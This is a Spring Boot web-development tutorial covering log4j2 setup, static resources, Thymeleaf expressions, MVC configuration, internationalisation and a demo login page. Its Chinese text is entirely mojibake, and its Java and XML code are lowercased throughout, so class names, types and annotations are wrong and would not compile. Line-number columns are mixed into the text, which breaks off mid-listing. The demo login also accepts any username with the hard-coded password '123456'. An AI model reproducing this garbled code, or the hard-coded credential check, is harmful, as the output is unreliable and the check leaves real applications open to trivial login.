ä¸ºlogbackæ¯log4jçåçº§çæ¬ï¼éå¸¸æåµä¸ï¼æä»¬ä¼ä½¿ç¨log4j2ã\n\n\n# åæ¢æ¥å¿æ¡æ¶slf4j+log4j2\n\né¦åå°starter-loggingæé¤ï¼ä½¿ç¨starter-log4j2\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarterâweb</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>springâbootâstarterâlogging</artifactid>\n            <groupid>org.springframework.boot</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarterâlog4j2</artifactid>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# webå¼å\n\nä½¿ç¨springbootè¿è¡webå¼åçæµç¨ï¼\n\n 1. åå»ºspringbootåºç¨ï¼å¹¶éæ©ç¸å³çç»ä»¶\n 2. ç¼åå°éçéç½®æä»¶\n 3. ç¼åä¸å¡ä»£ç \n\n\n# springbootå¯¹éæèµæºçå¤ç\n\nspringbootå¯¹éæèµæºçèªå¨éç½®ç¸å³åæ°å¨ä¸é¢è¿ä¸ªç±»éé¢å®æçã\n\n@configurationproperties(prefix = "spring.resources", ignoreunknownfields = false)\npublic class resourceproperties implements resourceloaderaware {\n//å¯ä»¥è®¾ç½®åéæèµæºæå³çåæ°ï¼ç¼å­æ¶é´ç­\n\n\n1\n2\n3\n\n\nspringmvcç¸å³çèªå¨éç½®é½ä¼éç½®å°webmvcautoconfigurationä¸­ï¼ä¸é¢çåå®¹æ¯å¯¼å¥webjarså¯¼å¥éæèµæºçæ¹å¼ï¼\n\n@override\npublic void addresourcehandlers(resourcehandlerregistry registry) {\n    if (!this.resourceproperties.isaddmappings()) {\n        logger.debug("default resource handling disabled");\n        return;\n    }\n    integer cacheperiod = this.resourceproperties.getcacheperiod();\n    if (!registry.hasmappingforpattern("/webjars/**")) {\n        customizeresourcehandlerregistration(\n            registry.addresourcehandler("/webjars/**")\n            .addresourcelocations(\n                "classpath:/meta-inf/resources/webjars/")\n            .setcacheperiod(cacheperiod));\n    }\n    string staticpathpattern = this.mvcproperties.getstaticpathpattern();\n    if (!registry.hasmappingforpattern(staticpathpattern)) {\n        customizeresourcehandlerregistration(\n            registry.addresourcehandler(staticpathpattern)\n            .addresourcelocations(\n                this.resourceproperties.getstaticlocations())\n            .setcacheperiod(cacheperiod));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néè¿webjarsæä»¬å¯ä»¥ä½¿ç¨jaråçæ¹å¼å°éæèµæºå¼å¥é¡¹ç®ä¸­ãå¯¹äºè¯·æ±ä¸­/webjarsä¸çä»»æè¯·æ±é½å»classpath:/meta-inf/resources/webjars/è¿ä¸ªè·¯å¾å»å¯»æ¾ã\n\nstring staticpathpattern = this.mvcproperties.getstaticpathpattern();\n\n\n1\n\n\nè¿è¡ä»£ç è·åäº/**çè·¯å¾ï¼è®¿é®å½åé¡¹ç®çææèµæºå¦ææ²¡äººå¤çï¼é»è®¤ä»resourcepropertiesä¸­è·åéæè·¯å¾ï¼éç½®çéæè·¯å¾æ¯ï¼\n\n\tprivate static final string[] classpath_resource_locations = {\n\t\t\t"classpath:/meta-inf/resources/", "classpath:/resources/",\n\t\t\t"classpath:/static/", "classpath:/public/" };\n\n\tprivate static final string[] resource_locations;\n\n\tstatic {\n\t\tresource_locations = new string[classpath_resource_locations.length\n\t\t\t\t+ servlet_resource_locations.length];\n\t\tsystem.arraycopy(servlet_resource_locations, 0, resource_locations, 0,\n\t\t\t\tservlet_resource_locations.length);\n\t\tsystem.arraycopy(classpath_resource_locations, 0, resource_locations,\n\t\t\t\tservlet_resource_locations.length, classpath_resource_locations.length);\n\t}\n\n\t/**\n\t * locations of static resources. defaults to classpath:[/meta-inf/resources/,\n\t * /resources/, /static/, /public/] plus context:/ (the root of the servlet context).\n\t */\n\tprivate string[] staticlocations = resource_locations;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nå æ­¤ï¼å¯¹äº/**çè®¿é®è·¯å¾ï¼å¦ææ²¡æäººå¤çå°±è®¿é®ä¸é¢çå ä¸ªè·¯å¾å¯»æ¾èµæº:\n\n"classpath:/meta-inf/resources/"\n"classpath:/resources/",\n"classpath:/static/"\n"classpath:/public/" \n\n\n1\n2\n3\n4\n\n\nå¯¹äºæ¬¢è¿é¡µçè®¿é®æ å°ï¼æ å°å°æ¯ä¸ªéæèµæºæä»¶å¤¹ä¸­çææindex.htmlã\n\n@bean\npublic welcomepagehandlermapping welcomepagehandlermapping(\n    resourceproperties resourceproperties) {\n    return new welcomepagehandlermapping(resourceproperties.getwelcomepage(),\n                                         this.mvcproperties.getstaticpathpattern());  //private string staticpathpattern = "/**";\n}\n\nprivate string[] getstaticwelcomepagelocations() {\n    string[] result = new string[this.staticlocations.length];\n    for (int i = 0; i < result.length; i++) {\n        string location = this.staticlocations[i];\n        if (!location.endswith("/")) {\n            location = location + "/";\n        }\n        result[i] = location + "index.html";\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nå¯¹äºå¾æ çæ å°\n\n@configuration\n@conditionalonproperty(value = "spring.mvc.favicon.enabled", matchifmissing = true)\npublic static class faviconconfiguration {\n\n    private final resourceproperties resourceproperties;\n\n    public faviconconfiguration(resourceproperties resourceproperties) {\n        this.resourceproperties = resourceproperties;\n    }\n\n    @bean\n    public simpleurlhandlermapping faviconhandlermapping() {\n        simpleurlhandlermapping mapping = new simpleurlhandlermapping();\n        mapping.setorder(ordered.highest_precedence + 1);\n        mapping.seturlmap(collections.singletonmap("**/favicon.ico",     // è¿æ¯å¨éæèµæºæä»¶å¤¹ä¸å¯»æ¾\n                                                   faviconrequesthandler()));\n        return mapping;\n    }\n\n\n    list<resource> getfaviconlocations() {\n        list<resource> locations = new arraylist<resource>(\n            this.staticlocations.length + 1);\n        if (this.resourceloader != null) {\n            for (string location : this.staticlocations) {\n                locations.add(this.resourceloader.getresource(location));\n            }\n        }\n        locations.add(new classpathresource("/"));\n        return collections.unmodifiablelist(locations);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# thymeleafæ¨¡æ¿å¼æ\n\nspringbootæ¯ä»¥jarçæ¹å¼æåï¼å¹¶ä¸åµå¥å¼çtomcatå¹¶ä¸æ¯æjspï¼springbootæ¨èä½¿ç¨thymeleafæ¨¡æ¿å¼æè¿è¡å¼åã\n\n\n\nå¼å¥thymeleafæ¨¡æ¿å¼æçæ¹æ³\n\n<properties>\n    <thymeleaf.version>3.0.9.release</thymeleaf.version>\n    \x3c!-- å¸å±åè½çæ¯æç¨åº thymeleaf3ä¸»ç¨åº layout2ä»¥ä¸çæ¬ --\x3e\n    \x3c!-- thymeleaf2 layout1 --\x3e\n    <thymeleaf-layout-dialect.version>2.2.2</thymeleaf-layout-dialect.version>\n</properties>\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-thymeleaf</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nthymeleafçèªå¨éç½®ï¼é»è®¤å¸®æä»¬æ·»å äºæ¨¡æ¿è§£æå¨ç­ç»ä»¶ï¼èé»è®¤è§åéç½®å¨thymeleafpropertiesä¸­\n\n@configurationproperties(prefix = "spring.thymeleaf")\npublic class thymeleafproperties {\n\n    private static final charset default_encoding = charset.forname("utf-8");\n\n    private static final mimetype default_content_type = mimetype.valueof("text/html");\n\n    public static final string default_prefix = "classpath:/templates/";\n\n    public static final string default_suffix = ".html";\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ ¹æ®ä»¥ä¸çéç½®ï¼åªéè¦å°æä»¬çthymeleafæ¨¡æ¿æ¾ç½®å°classpath:/templates/ä¸­ï¼å¹¶ä»¥htmlç»å°¾ï¼å°±å¯ä»¥è¢«thymeleafæ¨¡æ¿å¼æè§£æã\n\n# ä½¿ç¨æ¹æ³\n\n 1. å¯¼å¥thymeleafåç§°ç©ºé´\n\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n\n\n1\n\n\n 2. thymeleafè¯­æ³ï¼åèææ¡£ä¸è½½\n\n 3. æ ç­¾\n\n\n\n 4. è¡¨è¾¾å¼\n\nç®åè¡¨è¾¾å¼ï¼\nåéè¡¨è¾¾å¼ ${...}ï¼è·ååéå¼ï¼ognlï¼\n\t1ï¼ãè·åå¯¹è±¡çå±æ§ãè°ç¨æ¹æ³\n\t2ï¼ãä½¿ç¨åç½®çåºæ¬å¯¹è±¡ï¼\n\t#ctx : the context object.\n    #vars: the context variables.\n    #locale : the context locale.\n    #request : (only in web contexts) the httpservletrequest object.\n    #response : (only in web contexts) the httpservletresponse object.\n    #session : (only in web contexts) the httpsession object.\n    #servletcontext : (only in web contexts) the servletcontext object.\n    ${session.foo}\nåç½®çä¸äºå·¥å·å¯¹è±¡ï¼\n    #execinfo : information about the template being processed.\n    #messages : methods for obtaining externalized messages inside variables expressions, in the\n    same way as they would be obtained using #{â¦} syntax.\n    #uris : methods for escaping parts of urls/uris\n    #conversions : methods for executing the configured conversion service (if any).\n    #dates : methods for java.util.date objects: formatting, component extraction, etc.\n    #calendars : analogous to #dates , but for java.util.calendar objects.\n    #numbers : methods for formatting numeric objects.\n    #strings : methods for string objects: contains, startswith, prepending/appending, etc.\n    #objects : methods for objects in general.\n    #bools : methods for boolean evaluation.\n    #arrays : methods for arrays.\n    #lists : methods for lists.\n    #sets : methods for sets.\n    #maps : methods for maps.\n    #aggregates : methods for creating aggregates on arrays or collections.\n    #ids : methods for dealing with id attributes that might be repeated (for example, as a\n    result of an iteration).\néæ©åéè¡¨è¾¾å¼ *{...}ï¼éæ©è¡¨è¾¾å¼ï¼å${}å¨åè½ä¸æ¯ä¸æ ·\n\tè¡¥åï¼éå th:object="${session.user}ï¼\n    &lt;div th:object="${session.user}">\n    &lt;p>name: &lt;span th:text="*{firstname}">sebastian&lt;/span>.&lt;/p>\n    &lt;p>surname: &lt;span th:text="*{lastname}">pepper&lt;/span>.&lt;/p>\n    &lt;p>nationality: &lt;span th:text="*{nationality}">saturn&lt;/span>.&lt;/p>\n    &lt;/div>\nmessage expressions: #{...}ï¼è·åå½éååå®¹\nlink url expressions: @{...}ï¼å®ä¹urlï¼\n\t@{/order/process(execid=${execid},exectype=\'fast\')}\nfragment expressions: ~{...}ï¼çæ®µå¼ç¨è¡¨è¾¾å¼\n\t&lt;div th:insert="~{commons :: main}">...&lt;/div>\nliteralsï¼å­é¢éï¼\n    text literals: \'one text\' , \'another one!\' ,â¦\n    number literals: 0 , 34 , 3.0 , 12.3 ,â¦\n    boolean literals: true , false\n    null literal: null\n    literal tokens: one , sometext , main ,â¦\ntext operations:ï¼ææ¬æä½ï¼\n    string concatenation: +\n    literal substitutions: |the name is ${name}|\narithmetic operations:ï¼æ°å­¦è¿ç®ï¼\n    binary operators: + , â , * , / , %\n    minus sign (unary operator): â\n    boolean operations:ï¼å¸å°è¿ç®ï¼\n    binary operators: and , or\n    boolean negation (unary operator): ! , not\n    comparisons and equality:ï¼æ¯è¾è¿ç®ï¼\n    comparators: > , &lt; , >= , &lt;= ( gt , lt , ge , le )\n    equality operators: == , != ( eq , ne )\n    conditional operators:æ¡ä»¶è¿ç®ï¼ä¸åè¿ç®ç¬¦ï¼\n    ifâthen: (if) ? (then)\n    ifâthenâelse: (if) ? (then) : (else)\n    default: (value) ?: (defaultvalue)\nspecial tokens:\n\tnoâoperation: _\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n\n# springmvcèªå¨éç½®\n\nspringbootå¸®æä»¬å®æäºspringmvcçèªå¨éç½®ï¼å®ä¹å¨webmvcautoconfigurationä¸­ã\n\nspring boot provides auto-configuration for spring mvc that works well with most applications.\n\nthe auto-configuration adds the following features on top of springâs defaults:\n\n * inclusion of contentnegotiatingviewresolver and beannameviewresolver beans.\n   \n   * èªå¨éç½®äºviewresolverï¼è§å¾è§£æå¨ï¼æ ¹æ®æ¹æ³çè¿åå¼å¾å°è§å¾å¯¹è±¡ï¼viewï¼ï¼è§å¾å¯¹è±¡å³å®å¦ä½æ¸²æï¼\n   * contentnegotiatingviewresolverï¼ç¨äºç»åææçè§å¾è§£æå¨\n   * æä»¬å¯ä»¥èªå·±ç»å®¹å¨ä¸­æ·»å ä¸ä¸ªè§å¾è§£æå¨ï¼ä¼èªå¨å°å¶ç»åè¿æ¥ã\n\n * support for serving static resources, including support for webjars (see below).\n\n * automatic registration of converter, genericconverter, formatter beans.\n   \n   * converterï¼è½¬æ¢å¨ï¼ public string hello(user user)ï¼ç±»åè½¬æ¢ä½¿ç¨converter\n   * formatter æ ¼å¼åå¨ï¼ 2017.12.17==>date\n\n * support for httpmessageconverters (see below).\n   \n   * httpmessageconverterï¼springmvcç¨æ¥è½¬æ¢httpè¯·æ±åååºçï¼user---json\n   * httpmessageconverters æ¯ä»å®¹å¨ä¸­ç¡®å®ï¼è·åææçhttpmessageconverter.\n   * èªå·±ç»å®¹å¨ä¸­æ·»å httpmessageconverterï¼åªéè¦å°èªå·±çç»ä»¶æ³¨åå®¹å¨ä¸­ ï¼@bean,@componentï¼\n\n * automatic registration of messagecodesresolver (see below).\n   \n   * å®ä¹éè¯¯ä»£ç çæè§å\n\n * static index.html support.\n\n * custom favicon support (see below).\n\n * automatic use of a configurablewebbindinginitializer bean (see below).\n   \n   * æä»¬å¯ä»¥éç½®ä¸ä¸ªconfigurablewebbindinginitializeræ¥æ¿æ¢é»è®¤çãï¼æ·»å å°å®¹å¨ï¼\n\nif you want to keep spring boot mvc features, and you just want to add additional mvc configuration (interceptors, formatters, view controllers etc.) you can add your own @configuration class of type webmvcconfigureradapter, but without @enablewebmvc. if you wish to provide custom instances of requestmappinghandlermapping, requestmappinghandleradapter or exceptionhandlerexceptionresolver you can declare a webmvcregistrationsadapter instance providing such components.\n\nif you want to take complete control of spring mvc, you can add your own @configuration annotated with @enablewebmvc.\n\nå¦ææä»¬æ³è¦æå±springmvcç¸å³éç½®ï¼å¦æ¦æªå¨ï¼èµæºæ å°ç­ï¼\n\n<mvc:viewâcontroller path="/hello" viewâname="success"/>\n<mvc:interceptors>\n    <mvc:interceptor>\n        <mvc:mapping path="/hello"/>\n        <bean></bean>\n    </mvc:interceptor>\n</mvc:interceptors>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næä»¬å°±éè¦ç¼åä¸ä¸ªéç½®ç±»ï¼ç»§æ¿webmvcconfigureradapterã\n\n//ä½¿ç¨webmvcconfigureradapterå¯ä»¥æ¥æ©å±springmvcçåè½\n@configuration\npublic class mymvcconfig extends webmvcconfigureradapter {\n    @override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        // super.addviewcontrollers(registry);\n        //æµè§å¨åé /atguigu è¯·æ±æ¥å° success\n        registry.addviewcontroller("/atguigu").setviewname("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nåå ï¼\n\n 1. webmvcautoconfigurationæ¯springmvcçèªå¨éç½®ç±»\n 2. å¨åå¶ä»èªå¨éç½®æ¶ä¼å¯¼å¥@import(enablewebmvcconfiguration.class)\n 3. å®¹å¨ä¸­ææçwebmvcconfigureré½ä¼ä¸èµ·èµ·ä½ç¨ï¼æä»¬èªå·±ç¼åçä¹ä¼è¢«è°ç¨\n\n@configuration\npublic static class enablewebmvcconfiguration extends delegatingwebmvcconfiguration {\n    private final webmvcconfigurercomposite configurers = new webmvcconfigurercomposite();\n    //ä»å®¹å¨ä¸­è·åææçwebmvcconfigurer\n    @autowired(required = false)\n    public void setconfigurers(list<webmvcconfigurer> configurers) {\n        if (!collectionutils.isempty(configurers)) {\n            this.configurers.addwebmvcconfigurers(configurers);\n            //ä¸ä¸ªåèå®ç°ï¼å°ææçwebmvcconfigurerç¸å³éç½®é½æ¥ä¸èµ·è°ç¨ï¼\n            @override\n            // public void addviewcontrollers(viewcontrollerregistry registry) {\n            // for (webmvcconfigurer delegate : this.delegates) {\n            // delegate.addviewcontrollers(registry);\n            // }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nå¨é¢æ¥ç®¡springmvc\n\nå½æä»¬æ³è¦éç½®springmvcçææç»èæ¶ï¼å¯ä»¥ä½¿ç¨@enablewebmvcæ³¨è§£ï¼æ æ³¨å°éç½®ç±»ä¸ã\n\n//ä½¿ç¨webmvcconfigureradapterå¯ä»¥æ¥æ©å±springmvcçåè½\n@enablewebmvc\n@configuration\npublic class mymvcconfig extends webmvcconfigureradapter {\n    @override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        // super.addviewcontrollers(registry);\n        //æµè§å¨åé /atguigu è¯·æ±æ¥å° success\n        registry.addviewcontroller("/atguigu").setviewname("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nåçï¼\n\n 1. @enablewebmvcçæ ¸å¿\n\n@import(delegatingwebmvcconfiguration.class)\npublic @interface enablewebmvc {\n\n\n1\n2\n\n\n 2. @configuration\n    public class delegatingwebmvcconfiguration extends webmvcconfigurationsupport {\n    \n    \n    1\n    2\n    \n\n 3. @configuration\n    @conditionalonwebapplication\n    @conditionalonclass({ servlet.class, dispatcherservlet.class,\n                         webmvcconfigureradapter.class })\n    //å®¹å¨ä¸­æ²¡æè¿ä¸ªç»ä»¶çæ¶åï¼è¿ä¸ªèªå¨éç½®ç±»æçæ\n    @conditionalonmissingbean(webmvcconfigurationsupport.class)\n    @autoconfigureorder(ordered.highest_precedence + 10)\n    @autoconfigureafter({ dispatcherservletautoconfiguration.class,\n                         validationautoconfiguration.class })\n    public class webmvcautoconfiguration {\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 4. @enablewebmvcå°webmvcconfigurationsupportç»ä»¶å¯¼å¥è¿æ¥\n\n\n# ä¿®æ¹spingbooté»è®¤éç½®\n\nspringbootå¨èªå¨éç½®å¾å¤ç»ä»¶çæ¶åï¼åçå®¹å¨ä¸­ææ²¡æç¨æ·èªå·±éç½®çï¼@beanã@componentï¼å¦ææï¼å°±ç¨ç¨æ·éç½®çãå¦ææ²¡æï¼æèªå¨éç½®ãå¦ææäºç»ä»¶å¯ä»¥æå¤ä¸ªï¼viewresolverï¼å°ç¨æ·éç½®çåèªå·±é»è®¤çç»åèµ·æ¥ä½¿ç¨ã\n\nå¨springbootä¸­ä¼æéå¸¸å¤çxxxconfigurerå¸®å©æä»¬è¿è¡æ©å±éç½®ãå¨springbootä¸­ä¼æå¾å¤çxxxcustomizerå¸®å©æä»¬è¿è¡å®å¶éç½®\n\n\n# restfulcrud\n\n# 1. å¼å¥éæèµæº\n\næ ¹æ®ä¸é¢çspringbootå³äºéæèµæºçèªå¨éç½®ï¼æä»¬åªéè¦å°éæèµæºæ¾ç½®å°æå®çç®å½ä¸­ï¼å¦ææå¡å¨å¤çä¸äºæå®çè¯·æ±ï¼å°±ä¼å»éæèµæºæä»¶å¤¹ä¸å¯»æ¾ãæä»¬å¨é¡µé¢ä¸­å¼å¥éæèµæºæ¶ï¼ä¹å¯ä»¥ä½¿ç¨thymeleafçè¯­æ³ï¼è¿æ ·å¨è¯·æ±æ¶å°±å¯ä»¥æé¤é¡¹ç®åç§°å¯¹äºéæèµæºçå½±åäºã\n\n# 2. å½éåä¿¡æ¯\n\n * åå»ºå½éåéç½®æä»¶\n   \n   # ========= é»è®¤properties\n   login.btn=ç»å½~\n   login.password=å¯ç ~\n   login.remember=è®°ä½æ~\n   login.tip=è¯·ç»å½~\n   login.username=ç¨æ·å~\n   \n   # ========= login_en_us\n   login.btn=login in.\n   login.password=password\n   login.remember=remember me.\n   login.tip=please login.\n   login.username=username\n   \n   # ========= login_zh_cn\n   login.btn=ç»å½\n   login.password=å¯ç \n   login.remember=è®°ä½æ\n   login.tip=è¯·ç»å½\n   login.username=ç¨æ·å\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   \n\n * ç±äºspringbootå·²ç»å¸®å©æä»¬éç½®å¥½äºï¼æä»¬åªéè¦å¨é¡µé¢ä¸åå¼å°±å¯ä»¥äºãä½æ¯ç±äºé»è®¤éç½®çè·¯å¾æ¯ç±»è·¯å¾ä¸çmessageï¼æä»¬çå½éåæä»¶æ¾ç½®å¨i18nç®å½ä¸ï¼éè¦å¨springbootéç½®æä»¶ä¸­æå®è·¯å¾ã\n   \n   @configuration\n   @conditionalonmissingbean(value = messagesource.class, search = searchstrategy.current)\n   @autoconfigureorder(ordered.highest_precedence)\n   @conditional(resourcebundlecondition.class)\n   @enableconfigurationproperties\n   @configurationproperties(prefix = "spring.messages")\n   public class messagesourceautoconfiguration {\n   \n       private string basename = "messages";\n   \n       @bean\n       public messagesource messagesource() {\n           resourcebundlemessagesource messagesource = new resourcebundlemessagesource();\n           if (stringutils.hastext(this.basename)) {\n               messagesource.setbasenames(stringutils.commadelimitedlisttostringarray(\n                   stringutils.trimallwhitespace(this.basename)));\n           }\n           if (this.encoding != null) {\n               messagesource.setdefaultencoding(this.encoding.name());\n           }\n           messagesource.setfallbacktosystemlocale(this.fallbacktosystemlocale);\n           messagesource.setcacheseconds(this.cacheseconds);\n           messagesource.setalwaysusemessageformat(this.alwaysusemessageformat);\n           return messagesource;\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   \n   \n   spring:\n     messages:\n       basename: i18n/login\n   \n   \n   1\n   2\n   3\n   \n\n * thymeleafè·åå½éåçå¼\n   \n   <!doctype html>\n   <html lang="en" xmlns:th="https://www.thymeleaf.org">\n   \t<head>\n   \t\t<meta http-equiv="content-type" content="text/html; charset=utf-8">\n   \t\t<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n   \t\t<meta name="description" content="">\n   \t\t<meta name="author" content="">\n   \t\t<title>signin template for bootstrap</title>\n   \t\t\x3c!-- bootstrap core css --\x3e\n   \t\t<link th:href="@{/asserts/css/bootstrap.min.css}" rel="stylesheet">\n   \t\t\x3c!-- custom styles for this template --\x3e\n   \t\t<link th:href="@{/asserts/css/signin.css}" rel="stylesheet">\n   \t</head>\n   \n   \t<body class="text-center">\n   \t\t<form class="form-signin" action="dashboard.html">\n   \t\t\t<img class="mb-4" src="asserts/img/bootstrap-solid.svg" alt="" width="72" height="72">\n   \t\t\t<h1 class="h3 mb-3 font-weight-normal" th:text="#{login.tip}">please sign in</h1>\n   \t\t\t<label class="sr-only" th:text="#{login.username}">username</label>\n   \t\t\t<input type="text" class="form-control" th:placeholder="#{login.username}" placeholder="username" required="" autofocus="">\n   \t\t\t<label class="sr-only" th:text="#{login.password}">password</label>\n   \t\t\t<input type="password" class="form-control" th:placeholder="#{login.password}" placeholder="password" required="">\n   \t\t\t<div class="checkbox mb-3">\n   \t\t\t\t<label>\n             <input type="checkbox" value="remember-me"> [[#{login.remember}]]\n           </label>\n   \t\t\t</div>\n   \t\t\t<button class="btn btn-lg btn-primary btn-block" type="submit">[[#{login.btn}]]</button>\n   \t\t\t<p class="mt-5 mb-3 text-muted">Â© 2017-2018</p>\n   \t\t\t<a class="btn btn-sm">ä¸­æ</a>\n   \t\t\t<a class="btn btn-sm">english</a>\n   \t\t</form>\n   \n   \t</body>\n   \n   </html>\t\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   \n\nspringbootå®æå½éåçåçï¼\n\næå¡å¨ç¥éæä»¬éè¦è¿è¡å½éåçè¯­è¨ï¼æ¯å ä¸ºæä»¬å¨åéè¯·æ±æ¶ï¼è¯·æ±åæºå¸¦äºä¸ä¸ªaccept-language: en-us,en;q=0.9,zh-cn;q=0.8,zh;q=0.7å­æ®µï¼æå¡å¨æ ¹æ®è¯¥å­æ®µå°æå®çå½éåé¡µé¢è¿åãææ¶åæä»¬å¸æèªå®ä¹å½éåçè§åï¼æ¯å¦å¨è¯·æ±åæ°ä¸­æºå¸¦å½åé¡µé¢çå½éååæ°ã\n\n<a class="btn btn-sm" th:href="@{/index(language=\'zh_cn\')}">ä¸­æ</a>\n<a class="btn btn-sm" th:href="@{/index(language=\'en_us\')}">english</a>\n\n\n1\n2\n\n\nèªå®ä¹å½éåå¤çå¨ï¼\n\npackage com.pwddd.springboot.component;\n\nimport org.apache.tomcat.jni.local;\nimport org.springframework.util.stringutils;\nimport org.springframework.web.servlet.localeresolver;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\nimport java.util.locale;\n\npublic class paramlocalresolver implements localeresolver {\n    @override\n    public locale resolvelocale(httpservletrequest httpservletrequest) {\n        string language = httpservletrequest.getparameter("language");\n        locale locale = locale.getdefault();\n        if (!stringutils.isempty(language)){\n            string[] s = language.split("_");\n            locale = new locale(s[0],s[1]);\n        }else{\n            string languages = httpservletrequest.getheader("accept-language");\n            string defaultlanguage = languages.split(",")[0];\n            string[] split = defaultlanguage.split("-");\n            locale = new locale(split[0],split[1]);\n        }\n        return locale;\n    }\n\n    @override\n    public void setlocale(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, locale locale) {\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\næ³¨åå½éåå¤çå¨ï¼å°æä»¬èªå·±çå½éåå¤çå¨æ¾å°å®¹å¨ä¸­ã\n\n@bean\npublic localeresolver localeresolver(){\n    return new paramlocalresolver();\n}\n\n\n1\n2\n3\n4\n\n\n# 3. ç»å½åè½\n\nè¿æ¬¡è®¾è®¡çç»å½åè½å°±ä¸éè¦é¾æ¥æ°æ®åºäºï¼åªè¦æäº¤äºç¨æ·åï¼å¹¶ä¸å¯ç ä¸º123456å°±å¤å®ä¸ºç»å½æåã\n\n * æ§å¶å¨è®¾ç½®\n   \n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.controller;\n   import org.springframework.util.stringutils;\n   import org.springframework.web.bind.annotation.getmapping;\n   import org.springframework.web.bind.annotation.postmapping;\n   import org.springframework.web.bind.annotation.requestmapping;\n   import org.springframework.web.bind.annotation.requestparam;\n   \n   import java.util.map;\n   \n   @controller\n   @requestmapping("/user")\n   public class usercontroller {\n   \n       @postmapping("/login")\n       public string login(@requestparam("username") string username, @requestparam("password") string password, map<string,object> map){\n           if (!stringutils.isempty(username) && !stringutils.isempty(password) && password.equals("123456")){\n               return "dashboard";\n           }else {\n               map.put("msg","ç»éå¤±è´¥ï¼è¯·ç¡®è®¤ç¨æ·åå¯ç æ¯å¦æ­£ç¡®~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   \n\n * éè¯¯ä¿¡æ¯æ¾ç¤º\n   \n   <p style="color: red" th:text="${msg}" th:if="${not #strings.isempty(msg)}" ></p>\n   å½msgä¸æ¯ç©ºçæ¶åæ¾ç¤ºã\n   \n   \n   1\n   2\n   \n\n * å¤çç»å½ä¿¡æ¯éå¤æäº¤ - ä½¿ç¨éå®å\n   \n   // è®¾ç½®è§å¾è§£æ\n   registry.addviewcontroller("/main").setviewname("dashboard");\n   \n   // ä¿®æ¹æ§å¶å¨\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.controller;\n   import org.springframework.util.stringutils;\n   import org.springframework.web.bind.annotation.getmapping;\n   import org.springframework.web.bind.annotation.postmapping;\n   import org.springframework.web.bind.annotation.requestmapping;\n   import org.springframework.web.bind.annotation.requestparam;\n   \n   import java.util.map;\n   \n   @controller\n   @requestmapping("/user")\n   public class usercontroller {\n   \n       @postmapping("/login")\n       public string login(@requestparam("username") string username, @requestparam("password") string password, map<string,object> map){\n           if (!stringutils.isempty(username) && !stringutils.isempty(password) && password.equals("123456")){\n               return "redirect:/main";\n           }else {\n               map.put("msg","ç»éå¤±è´¥ï¼è¯·ç¡®è®¤ç¨æ·åå¯ç æ¯å¦æ­£ç¡®~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   